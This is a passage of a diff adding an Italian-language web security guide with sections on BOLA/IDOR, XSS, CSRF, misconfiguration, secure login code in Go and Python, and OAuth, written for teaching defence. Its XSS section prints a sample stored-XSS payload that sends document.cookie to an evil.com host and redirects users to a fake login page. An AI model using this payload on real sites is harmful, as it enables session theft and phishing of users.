+                        font-size="10">Qualsiasi utente può recuperare qualsiasi ID</text>
+
+                    <!-- Fix -->
+                    <rect x="530" y="180" width="140" height="30" rx="6" fill="#e0e9dd" stroke="#3f6f4e" />
+                    <text x="600" y="199" text-anchor="middle" fill="#3f6f4e" font-family="JetBrains Mono,monospace"
+                        font-size="9">DOVE id=5 E user_id=$ctx</text>
+                </svg>
+                <div class="diagram-caption">Fig 6: i controlli di autenticazione a livello di routing non proteggono i dati a livello DB.
+                    Aggiungi controlli di proprietà nella query.</div>
+            </div>
+
+            <h3>(1) BOLA: Autorizzazione a livello di oggetto danneggiato</h3>
+            <p><em>(Chiamato anche IDOR, Insecure Direct Object Reference)</em></p>
+            <p>L'utente A può accedere, modificare o eliminare le risorse dell'utente B indovinando o ripetendo i propri ID.</p>
+
+            <pre><span class="lang-label">SQL / BOLA Fix</span><span class="cmt">--VULNERABLE: fetches invoice 5 regardless of who is asking</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> invoices <span class="kw">WHERE</span> id = $1
+
+<span class="cmt">-- FIXED: also requires the invoice to belong to the requesting user</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> invoices
+<span class="kw">WHERE</span>  id = $1
+  <span class="kw">AND</span>  user_id = $2    <span class="cmt">-- $2 comes from the verified session/JWT, not user input</span>
+
+<span class="cmt">-- If no row: return 404 (not 403)</span>
+<span class="cmt">-- Why 404? A 403 CONFIRMS the resource exists -&gt; information leak</span>
+<span class="cmt">-- A 404 gives the attacker no information -&gt; is it missing, or forbidden?</span></pre>
+
+            <div class="callout security">Ritorno <strong>404 Non trovato</strong> (non 403 Forbidden) quando un utente lo richiede
+                una risorsa che non possiedono. Un 403 dice all'aggressore &quot;questo esiste, ma non puoi averlo&quot;, confermando
+                l'esistenza della risorsa consente ulteriori attacchi (enumerazione, ingegneria sociale).</div>
+
+            <h3>(2) BFLA: Autorizzazione del livello di funzione interrotta</h3>
+            <p>Un utente normale accede agli endpoint di solo amministratore perché mancano i controlli del ruolo a livello di routing.
+                Credere che &quot;nessuno conosca l'URL /admin&quot; lo è <strong>sicurezza attraverso l’oscurità</strong>: che non lo è
+                sicurezza a tutti.</p>
+
+            <pre><span class="lang-label">Go / Role Middleware</span><span class="kw">func</span> <span class="fn">RequireRole</span>(role <span class="type">string</span>) func(http.Handler) http.Handler {
+    <span class="kw">return func</span>(next http.Handler) http.Handler {
+        <span class="kw">return</span> http.HandlerFunc(<span class="kw">func</span>(w http.ResponseWriter, r *http.Request) {
+            user, ok := r.Context().Value(<span class="str">"user"</span>).(<span class="type">User</span>)
+            <span class="kw">if</span> !ok || user.Role != role {
+                http.Error(w, <span class="str">"forbidden"</span>, http.StatusForbidden)
+                <span class="kw">return</span>
+            }
+            next.ServeHTTP(w, r)
+        })
+    }
+}
+
+<span class="cmt">// Router setup</span>
+r.With(RequireAuth, RequireRole(<span class="str">"admin"</span>)).
+  Get(<span class="str">"/admin/invoices"</span>, adminInvoicesHandler)</pre>
+
+            <h3>Il modello mentale orizzontale vs verticale</h3>
+            <div class="compare-grid">
+                <div class="compare-card">
+                    <h4>Attacco Orizzontale (BOLA)</h4>
+                    <ul>
+                        <li>L'utente A legge/modifica le risorse dell'utente B</li>
+                        <li>Il campo di applicazione si amplia <em>tra gli utenti</em></li>
+                        <li>Correzione: aggiungi <code>AND user_id = $ctx_user</code> ad ogni domanda</li>
+                        <li>Restituisce 404, non 403</li>
+                    </ul>
+                </div>
+                <div class="compare-card">
+                    <h4>Attacco verticale (BFLA)</h4>
+                    <ul>
+                        <li>L'utente normale accede alle funzioni di amministrazione</li>
+                        <li>L'ambito si eleva <em>aumentare i livelli di privilegio</em></li>
+                        <li>Correzione: middleware dei ruoli su ogni percorso sensibile</li>
+                        <li>Default-deny: nega tutto ciò che non è esplicitamente consentito</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Utilizza UUID, non ID sequenziali, negli URL</h3>
+            <p>ID sequenziali (<code>/invoices/101</code>, <code>/invoices/102</code>) consentono agli aggressori di enumerarli tutti
+                risorse. Un UUID simile <code>/invoices/f47ac10b-58cc-4372-a567-0e02b2c3d479</code> è efficace
+                impercettibile, 2^122 valori possibili. Utilizza gli UUID come chiavi primarie in qualsiasi tabella in cui sono esposti i record
+                URL.</p>
+        </section>
+
+        <!-- 10 XSS -->
+        <section id="xss">
+            <div class="section-header"><span class="badge">10</span>
+                <h2>Scripting tra siti (XSS)</h2>
+            </div>
+
+            <p>XSS si verifica quando il JavaScript di un utente malintenzionato viene eseguito nel browser di un altro utente, nel contesto del tuo
+                piattaforma. È un'iniezione, ma l'obiettivo è il motore HTML/JS del browser anziché il database.</p>
+
+            <h3>Perché XSS è pericoloso</h3>
+            <p>JavaScript in esecuzione nel contesto della tua piattaforma può:</p>
+            <ul>
+                <li>Leggi tutto <code>document.cookie</code> (token di sessione non protetti da HttpOnly).</li>
+                <li>Leggi <code>localStorage</code> (Token JWT, chiavi API).</li>
+                <li>Effettua richieste API come utente che ha effettuato l'accesso (rappresentazione).</li>
+                <li>Reindirizzare gli utenti a pagine di phishing per rubare credenziali.</li>
+                <li>Modificare il contenuto della pagina per ingannare l'utente (falsi moduli di accesso, falsi avvisi).</li>
+            </ul>
+
+            <h3>XSS archiviato: il tipo più pericoloso</h3>
+            <p>Un utente invia un commento/post contenente un file <code>&lt;script&gt;</code> etichetta. Il tuo server lo memorizza. Ogni
+                l'utente che visualizza quel post fa eseguire lo script nel proprio browser.</p>
+
+            <pre><span class="lang-label">Stored XSS Attack</span><span class="cmt">&lt;!-- Attacker submits this as a "comment" --&gt;</span>
+&lt;<span class="kw">script</span>&gt;
+  <span class="cmt">// Steal session cookie and send to attacker's server</span>
+  fetch(<span class="str">'https://evil.com/steal?c='</span> + document.cookie);
+
+  <span class="cmt">// Or silently redirect to phishing page</span>
+  window.location = <span class="str">'https://evil.com/fake-login'</span>;
+&lt;<span class="str">/script</span>&gt;
+
+<span class="cmt">&lt;!-- This script is stored in your DB and injected into every user's browser --&gt;</span></pre>
+
+            <h3>Prevenzione: disinfettare prima di riporre</h3>
+            <p>Prima di archiviare qualsiasi codice HTML/markdown fornito dall'utente, elimina i tag e gli attributi pericolosi. Usa un modello testato in battaglia
+                biblioteca; non scrivere mai il tuo disinfettante.</p>
+
+            <pre><span class="lang-label">Python / bleach sanitisation</span><span class="kw">import</span> bleach
+
+ALLOWED_TAGS = [<span class="str">'p'</span>, <span class="str">'b'</span>, <span class="str">'i'</span>, <span class="str">'em'</span>, <span class="str">'strong'</span>, <span class="str">'a'</span>, <span class="str">'ul'</span>, <span class="str">'ol'</span>, <span class="str">'li'</span>]
+ALLOWED_ATTRS = {<span class="str">'a'</span>: [<span class="str">'href'</span>]}
+
+<span class="kw">def</span> <span class="fn">sanitise_comment</span>(raw_html: str) -> str:
+    <span class="cmt"># Strip ALL tags not in allow-list, strip dangerous attributes</span>
+    <span class="kw">return</span> bleach.clean(
+        raw_html,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRS,
+        strip=<span class="kw">True</span>  <span class="cmt"># strip disallowed, don't escape</span>
+    )
+
+<span class="cmt"># &lt;script&gt;...&lt;/script&gt; -&gt; stripped entirely</span>
+<span class="cmt"># &lt;b&gt;bold&lt;/b&gt; -&gt; kept</span>
+<span class="cmt"># &lt;img onerror="..."&gt; -&gt; attribute stripped</span></pre>
+
+            <h3>Politica di sicurezza dei contenuti (CSP): ultima linea di difesa</h3>
+            <p>CSP è un'intestazione di risposta HTTP che informa il browser <em>esattamente</em> quali script possono essere eseguiti.
+                Anche se un aggressore inietta a <code>&lt;script&gt;</code> tag, il browser lo blocca se viola il tag
+                politica.</p>
+
+            <pre><span class="lang-label">HTTP Header / CSP</span><span class="cmt"># Only load scripts from your own domain. Block all inline scripts.</span>
+Content-Security-Policy: default-src 'self';
+                         script-src 'self';
+                         object-src 'none';
+                         base-uri 'self'</pre>
+
+            <div class="callout">Il CSP è una rete di sicurezza, non un sostituto della sanificazione. Risolvi prima la causa principale
+                (disinfettare l'input), quindi aggiungere CSP come livello di difesa in profondità.</div>
+        </section>
+
+        <!-- 11 CSRF -->
+        <section id="csrf">
+            <div class="section-header"><span class="badge">11</span>
+                <h2>CSRF: falsificazione di richieste intersito</h2>
+            </div>
+
+            <p>CSRF sfrutta il fatto che i browser allegano automaticamente i cookie alle richieste, anche quando la richiesta
+                proviene da un sito Web diverso. Un attaccante acceso <code>evil.com</code> può attivare una richiesta a
+                <code>bank.com</code> e il tuo browser include il tuo <code>bank.com</code> cookie di sessione.</p>
+
+            <div class="callout tip"><strong>CSRF è in gran parte un problema risolto</strong> in pile moderne. Finché tu
+                impostare <code>SameSite=Strict</code> o <code>SameSite=Lax</code> sul cookie di sessione (quali browser
+                predefinito a <code>Lax</code>) e configuri CORS correttamente, sei protetto. Questa sezione copre
+                la teoria per i sistemi legacy.</div>
+
+            <h3>Mitigazioni</h3>
+            <ul>
+                <li><strong>Flag cookie sullo stesso sito</strong>: <code>Strict</code> o <code>Lax</code> blocca i cookie
+                    richieste multiorigine. I browser moderni hanno come impostazione predefinita <code>Lax</code>.</li>
+                <li><strong>Configurazione CORS</strong>: consente solo le richieste dal tuo dominio frontend.</li>
+                <li><strong>Token CSRF</strong>: per sistemi legacy basati su moduli: incorpora un token univoco in ogni modulo,
+                    verificarlo lato server.</li>
+            </ul>
+        </section>
+
+        <!-- 12 MISCONFIG -->
+        <section id="misconfig">
+            <div class="section-header"><span class="badge">12</span>
+                <h2>Errori di configurazione: buchi di sicurezza creati dall'utente</h2>
+            </div>
+
+            <h3>(1) Segreti nel controllo della versione</h3>
+            <p>L'errore più catastroficamente comune: chiavi API, password di database, segreti JWT o chiavi di crittografia
+                impegnato con Git. Una volta nella cronologia dei commit, la rotazione del segreto nel codice non aiuta, lo è il vecchio valore
+                permanentemente nel registro git.</p>
+
+            <div class="callout danger"><strong>Se impegni accidentalmente un segreto su Git, ruotalo/revocalo immediatamente
+                    esso.</strong> L'eliminazione del file in un nuovo commit non lo rimuove dalla cronologia. Supponiamo che il segreto sia
+                compromesso nel momento in cui ha toccato un repository remoto.</div>
+
+            <pre><span class="lang-label">Shell / Pre-commit hook with gitleaks</span><span class="cmt"># Install: brew install gitleaks</span>
+<span class="cmt"># .git/hooks/pre-commit</span>
+gitleaks protect --staged --no-git -v
+<span class="cmt"># Blocks commit if API keys, passwords, tokens detected in staged files</span></pre>
+
+            <h3>(2) Log di debug/verbosi in produzione</h3>
+            <p>In fase di sviluppo, il livello di log è in genere <code>DEBUG</code>, analisi dello stack completo, query SQL, request
+                corpi. In produzione deve essere <code>INFO</code> o <code>WARN</code>. Il debug accede alla produzione
+                esporre:</p>
+            <ul>
+                <li>Nomi di tabelle, nomi di colonne, struttura di query -&gt; abilita l'iniezione SQL mirata.</li>
+                <li>Percorsi dei file e nomi delle funzioni -&gt; rivela la struttura della base di codice.</li>
+                <li>PII dell'utente registrato accidentalmente -&gt; Violazione GDPR + responsabilità di violazione.</li>
+            </ul>
+
+            <pre><span class="lang-label">Go / Environment-aware log level</span><span class="kw">import</span> <span class="str">"log/slog"</span>
+
+<span class="kw">func</span> <span class="fn">setupLogger</span>() {
+    level := slog.LevelInfo  <span class="cmt">// default: production</span>
+    <span class="kw">if</span> os.Getenv(<span class="str">"APP_ENV"</span>) == <span class="str">"development"</span> {
+        level = slog.LevelDebug
+    }
+    slog.SetDefault(slog.New(slog.NewJSONHandler(os.Stdout,
+        &amp;slog.HandlerOptions{Level: level})))
+}</pre>
+
+            <h3>(3) Intestazioni di sicurezza</h3>
+            <p>Una singola chiamata al middleware aggiunge tutte le intestazioni di sicurezza standard del settore. Ogni framework principale ne ha uno:</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Intestazione</th>
+                        <th>Scopo</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>Content-Security-Policy</code></td>
+                        <td>Controlla quali script/risorse possono essere eseguiti (impedisce XSS)</td>
+                    </tr>
+                    <tr>
+                        <td><code>X-Frame-Options: DENY</code></td>
+                        <td>Impedisce l'incorporamento negli iframe (impedisce il clickjacking)</td>
+                    </tr>
+                    <tr>
+                        <td><code>X-Content-Type-Options: nosniff</code></td>
+                        <td>Previene gli attacchi di sniffing di tipo MIME</td>
+                    </tr>
+                    <tr>
+                        <td><code>Strict-Transport-Security</code></td>
+                        <td>Forza HTTPS, impedisce lo stripping SSL</td>
+                    </tr>
+                    <tr>
+                        <td><code>Referrer-Policy</code></td>
+                        <td>Controlla la quantità di informazioni sui referrer inviate multiorigine</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <pre><span class="lang-label">Go / Secure Headers Middleware (chi/middleware)</span><span class="kw">import</span> <span class="str">"github.com/go-chi/chi/v5/middleware"</span>
+
+r.Use(middleware.SetHeader(<span class="str">"X-Frame-Options"</span>, <span class="str">"DENY"</span>))
+r.Use(middleware.SetHeader(<span class="str">"X-Content-Type-Options"</span>, <span class="str">"nosniff"</span>))
+r.Use(middleware.SetHeader(<span class="str">"Referrer-Policy"</span>, <span class="str">"strict-origin-when-cross-origin"</span>))
+r.Use(middleware.SetHeader(
+    <span class="str">"Strict-Transport-Security"</span>,
+    <span class="str">"max-age=63072000; includeSubDomains; preload"</span>))
+r.Use(middleware.SetHeader(
+    <span class="str">"Content-Security-Policy"</span>,
+    <span class="str">"default-src 'self'; script-src 'self'; object-src 'none'"</span>))</pre>
+        </section>
+
+        <!-- 13 LAYERS -->
+        <section id="layers">
+            <div class="section-header"><span class="badge">13</span>
+                <h2>Difesa in profondità: nessun singolo strato è sufficiente</h2>
+            </div>
+
+            <blockquote>&quot;Nessuna singola difesa è perfetta. Costruiscila a strati. Un attaccante deve aggirarli tutti
+                contemporaneamente, il che è esponenzialmente più difficile.&quot;</blockquote>
+
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 240" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="240" fill="#fff" />
+                    <!-- Concentric rings (defence layers) -->
+                    <circle cx="340" cy="120" r="200" fill="none" stroke="#d8cfbe" stroke-width="1"
+                        stroke-dasharray="4 3" />
+                    <circle cx="340" cy="120" r="160" fill="none" stroke="#d8cfbe" stroke-width="1"
+                        stroke-dasharray="4 3" />
+                    <circle cx="340" cy="120" r="120" fill="none" stroke="#d8cfbe" stroke-width="1"
+                        stroke-dasharray="4 3" />
+                    <circle cx="340" cy="120" r="80" fill="none" stroke="#d8cfbe" stroke-width="1"
+                        stroke-dasharray="4 3" />
+                    <circle cx="340" cy="120" r="40" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="340" y="116" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="10" font-weight="700">Nucleo</text>
+                    <text x="340" y="128" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Logica</text>
+                    <!-- Layer labels -->
+                    <text x="340" y="66" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Convalida dell'input</text>
+                    <text x="340" y="24" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Operazioni parametrizzate</text>
+                    <text x="536" y="120" text-anchor="middle" fill="#37607f" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">AutN / AutZ</text>
+                    <text x="144" y="120" text-anchor="middle" fill="#37607f" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Limitazione della velocità</text>
+                    <text x="340" y="176" text-anchor="middle" fill="#37607f" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Intestazioni di sicurezza + CSP</text>
+                    <text x="340" y="216" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Monitoraggio + registri di controllo</text>
+                </svg>
+                <div class="diagram-caption">Fig 7: Difesa in profondità: l'attaccante deve sfondare ogni strato per raggiungerlo
+                    la logica del tuo core business.</div>
+            </div>
+
+            <h3>Le tre domande da porsi ad ogni confine</h3>
+            <ol>
+                <li><strong>Dove i dati attraversano un confine?</strong> (Utente -&gt; SQL, Utente -&gt; Shell, Utente -&gt; HTML)</li>
+                <li><strong>Cosa sto supponendo riguardo a questi dati?</strong> (È pulito? È un'e-mail valida? È sicura?)
+                </li>
+                <li><strong>E se queste ipotesi fossero sbagliate?</strong> (Cosa guadagna l’attaccante se viola
+                    questa ipotesi?)</li>
+            </ol>
+
+            <p>Se poni queste tre domande per ogni porzione di codice che gestisce l'input dell'utente, eviterai il 99% delle domande
+                le vulnerabilità che rompono i sistemi di produzione reali.</p>
+        </section>
+
+        <!-- 14 CODE GO -->
+        <section id="code-go">
+            <div class="section-header"><span class="badge">14</span>
+                <h2>Vai: Riferimento ai modelli sicuri</h2>
+            </div>
+
+            <h3>Endpoint di accesso sicuro completo</h3>
+            <pre><span class="lang-label">Go</span><span class="kw">func</span> <span class="fn">loginHandler</span>(db *pgxpool.Pool, redis *redis.Client) http.HandlerFunc {
+    <span class="kw">return func</span>(w http.ResponseWriter, r *http.Request) {
+        <span class="kw">var</span> req <span class="kw">struct</span> {
+            Email    <span class="type">string</span> <span class="str">`json:"email"`</span>
+            Password <span class="type">string</span> <span class="str">`json:"password"`</span>
+        }
+        json.NewDecoder(r.Body).Decode(&amp;req)
+
+        <span class="cmt">// 1. Validate format (first line of defence)</span>
+        <span class="kw">if</span> !isValidEmail(req.Email) || len(req.Password) &lt; <span class="num">8</span> {
+            http.Error(w, <span class="str">"invalid credentials"</span>, <span class="num">400</span>)
+            <span class="kw">return</span>
+        }
+
+        <span class="cmt">// 2. Parameterised query, no SQL injection possible</span>
+        <span class="kw">var</span> userID <span class="type">string</span>
+        <span class="kw">var</span> hashedPass <span class="type">string</span>
+        err := db.QueryRow(ctx,
+            <span class="str">"SELECT id, password_hash FROM users WHERE email = $1"</span>,
+            req.Email).Scan(&amp;userID, &amp;hashedPass)
+
+        <span class="cmt">// 3. Generic error, never reveal whether email exists</span>
+        <span class="kw">if</span> err != nil || !<span class="fn">verifyArgon2</span>(req.Password, hashedPass) {
+            http.Error(w, <span class="str">"invalid email or password"</span>, <span class="num">401</span>)
+            <span class="kw">return</span>
+        }
+
+        <span class="cmt">// 4. Cryptographically secure session ID</span>
+        sessionID := <span class="fn">generateSecureToken</span>(<span class="num">32</span>)
+
+        <span class="cmt">// 5. Store session in Redis with metadata</span>
+        redis.Set(ctx, <span class="str">"session:"</span>+sessionID,
+            userID, <span class="num">7</span>*<span class="num">24</span>*time.Hour)
+
+        <span class="cmt">// 6. Secure cookie, HttpOnly, Secure, SameSite=Strict</span>
+        http.SetCookie(w, &amp;http.Cookie{
+            Name: <span class="str">"session_id"</span>, Value: sessionID,
+            HttpOnly: <span class="kw">true</span>, Secure: <span class="kw">true</span>,
+            SameSite: http.SameSiteStrictMode,
+            MaxAge: <span class="num">7</span> * <span class="num">24</span> * <span class="num">3600</span>,
+        })
+        w.WriteHeader(http.StatusOK)
+    }
+}
+
+<span class="kw">func</span> <span class="fn">generateSecureToken</span>(n <span class="type">int</span>) <span class="type">string</span> {
+    b := <span class="kw">make</span>([]<span class="type">byte</span>, n)
+    rand.Read(b) <span class="cmt">// crypto/rand, not math/rand</span>
+    <span class="kw">return</span> base64.URLEncoding.EncodeToString(b)
+}</pre>
+        </section>
+
+        <!-- 15 CODE PYTHON -->
+        <section id="code-py">
+            <div class="section-header"><span class="badge">15</span>
+                <h2>Python: riferimento ai modelli sicuri</h2>
+            </div>
+
+            <pre><span class="lang-label">Python / FastAPI Secure Auth</span><span class="kw">from</span> fastapi <span class="kw">import</span> FastAPI, HTTPException, Response
+<span class="kw">from</span> argon2 <span class="kw">import</span> PasswordHasher
+<span class="kw">from</span> argon2.exceptions <span class="kw">import</span> VerifyMismatchError
+<span class="kw">import</span> secrets
+
+ph = PasswordHasher(time_cost=<span class="num">1</span>, memory_cost=<span class="num">65536</span>, parallelism=<span class="num">4</span>)
+
+<span class="str">@app.post("/login")</span>
+<span class="kw">async def</span> <span class="fn">login</span>(email: str, password: str, response: Response):
+    <span class="cmt"># 1. Parameterised query (psycopg2 / asyncpg)</span>
+    row = <span class="kw">await</span> db.fetchrow(
+        <span class="str">"SELECT id, password_hash FROM users WHERE email = $1"</span>, email
+    )
+
+    <span class="cmt"># 2. Constant-time verify. Generic error always.</span>
+    valid = <span class="kw">False</span>
+    <span class="kw">if</span> row:
+        <span class="kw">try</span>:
+            ph.verify(row[<span class="str">"password_hash"</span>], password)
+            valid = <span class="kw">True</span>
+        <span class="kw">except</span> VerifyMismatchError:
+            <span class="kw">pass</span>
+
+    <span class="kw">if not</span> valid:
+        <span class="kw">raise</span> HTTPException(<span class="num">401</span>, <span class="str">"invalid email or password"</span>)
+
+    <span class="cmt"># 3. Cryptographically secure session token (32 bytes = 256 bits)</span>
+    session_id = secrets.token_urlsafe(<span class="num">32</span>)
+    <span class="kw">await</span> redis.set(<span class="str">f"session:{session_id}"</span>, row[<span class="str">"id"</span>], ex=<span class="num">604800</span>)
+
+    <span class="cmt"># 4. HttpOnly + Secure + SameSite cookie</span>
+    response.set_cookie(
+        key=<span class="str">"session_id"</span>, value=session_id,
+        httponly=<span class="kw">True</span>, secure=<span class="kw">True</span>,
+        samesite=<span class="str">"strict"</span>, max_age=<span class="num">604800</span>
+    )
+    <span class="kw">return</span> {<span class="str">"status"</span>: <span class="str">"ok"</span>}</pre>
+
+            <pre><span class="lang-label">Python / BOLA-safe DB query</span><span class="kw">async def</span> <span class="fn">get_invoice</span>(invoice_id: int, current_user_id: int):
+    <span class="cmt"># ownership check IN the query, not after</span>
+    row = <span class="kw">await</span> db.fetchrow(
+        <span class="str">"SELECT * FROM invoices WHERE id=$1 AND user_id=$2"</span>,
+        invoice_id, current_user_id
+    )
+    <span class="kw">if not</span> row:
+        <span class="cmt"># 404, not 403. Don't confirm the invoice exists.</span>
+        <span class="kw">raise</span> HTTPException(<span class="num">404</span>, <span class="str">"invoice not found"</span>)
+    <span class="kw">return</span> row</pre>
+        </section>
+
+        <!-- 16 OAUTH -->
+        <section id="oauth">
+            <div class="section-header"><span class="badge">16</span>
+                <h2>OAuth 2.0 e OIDC: autenticazione delegata</h2>
+            </div>
+
+            <p>OAuth 2.0 è un <strong>quadro autorizzativo</strong> che consente a un'applicazione di terze parti di ottenere
+                accesso limitato all'account di un utente su un altro servizio, senza mai vedere la password dell'utente. OpenID
+                Connect (OIDC) è un sottile livello di identità sopra OAuth 2.0 che aggiunge l'autenticazione (chi è l'utente
+                <em>è</em>), non solo l'autorizzazione (quello che possono <em>fare</em>).</p>
+
+            <blockquote>&quot;Accedi con Google&quot; è OIDC. &quot;Consenti a questa app di leggere il tuo Google Drive&quot; è OAuth 2.0. Dentro
+                in pratica, i moderni fornitori di autenticazione (Clerk, Auth0) combinano entrambi.</blockquote>
+
+            <h3>I quattro ruoli</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Ruolo</th>
+                        <th>Chi è</th>
+                        <th>Esempio</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Proprietario della risorsa</strong></td>
+                        <td>L'utente</td>
+                        <td>Alice</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Cliente</strong></td>
+                        <td>La tua candidatura</td>
+                        <td>YourSaaS.com</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Server di autorizzazione</strong></td>
+                        <td>Emette token dopo il consenso</td>
+                        <td>Google, GitHub, Auth0</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Server delle risorse</strong></td>
+                        <td>API che contiene i dati dell'utente</td>
+                        <td>API di Google Calendar</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Flusso del codice di autorizzazione: lo standard sicuro</h3>
+            <p>Questo è il flusso utilizzato da ogni applicazione web seria. Mantiene i token lontani dalla barra degli URL del browser e
+                scambi di breve durata <em>codice</em> per i token lato server.</p>
+
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 420" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="420" fill="#fff" />
+                    <defs>
+                        <marker id="oa" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#5b5347" />
+                        </marker>
+                        <marker id="ob" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#b8402e" />
+                        </marker>
+                        <marker id="og" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#3f6f4e" />
+                        </marker>
+                        <marker id="ob2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#37607f" />
+                        </marker>
+                    </defs>
+                    <!-- Columns -->
+                    <text x="70" y="28" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="13"
+                        font-weight="700" fill="#211e1a">Browser/Utente</text>
+                    <text x="310" y="28" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="13"
+                        font-weight="700" fill="#211e1a">Il tuo back-end</text>
+                    <text x="570" y="28" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="13"
+                        font-weight="700" fill="#211e1a">Server di autenticazione (Google)</text>
+                    <!-- Lifelines -->
+                    <line x1="70" y1="35" x2="70" y2="410" stroke="#d8cfbe" stroke-width="1" stroke-dasharray="4 3" />
+                    <line x1="310" y1="35" x2="310" y2="410" stroke="#d8cfbe" stroke-width="1" stroke-dasharray="4 3" />
+                    <line x1="570" y1="35" x2="570" y2="410" stroke="#d8cfbe" stroke-width="1" stroke-dasharray="4 3" />
+
+                    <!-- Step 1 -->
+                    <line x1="72" y1="60" x2="308" y2="60" stroke="#b8402e" stroke-width="1.5" marker-end="url(#ob)" />
+                    <rect x="90" y="42" width="200" height="16" rx="3" fill="#fff" />
+                    <text x="190" y="54" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#b8402e">(1) Fare clic su &quot;Accedi con Google&quot;</text>
+
+                    <!-- Step 2 -->
+                    <line x1="308" y1="90" x2="72" y2="90" stroke="#5b5347" stroke-width="1.5" marker-end="url(#oa)" />
+                    <rect x="90" y="72" width="210" height="16" rx="3" fill="#fff" />
+                    <text x="190" y="84" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#5b5347">(2) Reindirizzamento a Google + stato + code_challenge</text>
+
+                    <!-- Step 3 -->
+                    <line x1="72" y1="130" x2="568" y2="130" stroke="#b8402e" stroke-width="1.5"
+                        marker-end="url(#ob)" />
+                    <rect x="160" y="112" width="260" height="16" rx="3" fill="#fff" />
+                    <text x="290" y="124" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#b8402e">(3) Il browser passa alla schermata di accesso + consenso di Google</text>
+
+                    <!-- Step 4 -->
+                    <line x1="568" y1="170" x2="72" y2="170" stroke="#5b5347" stroke-width="1.5"
+                        marker-end="url(#oa)" />
+                    <rect x="160" y="152" width="250" height="16" rx="3" fill="#fff" />
+                    <text x="290" y="164" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#5b5347">(4) Google reindirizza conauthorization_code</text>
+
+                    <!-- Step 5 -->
+                    <line x1="72" y1="210" x2="308" y2="210" stroke="#b8402e" stroke-width="1.5"
+                        marker-end="url(#ob)" />
+                    <rect x="90" y="192" width="200" height="16" rx="3" fill="#fff" />
+                    <text x="190" y="204" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#b8402e">(5) Il browser invia il codice alla richiamata del backend</text>
+
+                    <!-- Step 6 -->
+                    <line x1="312" y1="250" x2="568" y2="250" stroke="#3f6f4e" stroke-width="1.8"
+                        marker-end="url(#og)" />
+                    <rect x="360" y="232" width="190" height="16" rx="3" fill="#fff" />
+                    <text x="445" y="244" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#3f6f4e">(6) Codice degli scambi backend -&gt; access_token + id_token</text>
+                    <text x="445" y="260" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9"
+                        fill="#5b5347">(da server a server, non tocca mai il browser)</text>
+
+                    <!-- Step 7 -->
+                    <line x1="568" y1="285" x2="312" y2="285" stroke="#3f6f4e" stroke-width="1.8"
+                        marker-end="url(#og)" />
+                    <rect x="360" y="268" width="180" height="16" rx="3" fill="#fff" />
+                    <text x="445" y="280" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#3f6f4e">(7) Google restituisce token + informazioni utente (sottoscrizione, email)</text>
+
+                    <!-- Step 8 -->
+                    <line x1="308" y1="325" x2="72" y2="325" stroke="#37607f" stroke-width="1.5"
+                        marker-end="url(#ob2)" />
+                    <rect x="90" y="308" width="200" height="16" rx="3" fill="#fff" />
+                    <text x="190" y="320" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#37607f">(8) Il backend crea una sessione -&gt; imposta il cookie HttpOnly</text>
+
+                    <!-- PKCE note -->
+                    <rect x="20" y="350" width="640" height="50" rx="8" fill="#e0e9dd" stroke="#3f6f4e" />
+                    <text x="340" y="372" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="12"
+                        font-weight="700" fill="#3f6f4e">PKCE, chiave di prova per lo scambio di codici</text>
+                    <text x="340" y="390" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#5b5347">il client genera code_verifier (casuale) -&gt; lo sottopone a code_challenge -&gt; inviato
+                        passo (2)</text>
